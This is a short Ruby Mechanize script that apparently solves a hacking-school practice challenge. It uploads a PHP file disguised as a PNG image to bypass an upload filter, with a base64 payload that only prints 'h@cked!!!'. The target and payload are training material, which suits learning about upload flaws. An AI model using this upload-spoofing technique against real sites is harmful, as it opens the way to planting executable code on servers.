#!/usr/bin/ruby
require 'base64'
require 'mechanize'
mech=Mechanize.new
uri=URI.parse('http://www.hackerschool.jp/hack/take39.php')
str='PHPSESSID='
Mechanize::Cookie.parse(uri, str){|c|mech.cookie_jar.add(uri, c)}
mech.get(uri)
form=mech.page.form_with(:action=>'./take39.php')
form.file_upload_with(:name=>'input_file'){|up|
	up.file_data=Base64.decode64('PD9waHANCg0KICBlY2hvICdoQGNrZWQhISEnOw0KDQo/Pg==') #This file is CRLF...
	up.file_name='attack.php'
	up.mime_type='image/png'
}
form.submit
puts mech.page.body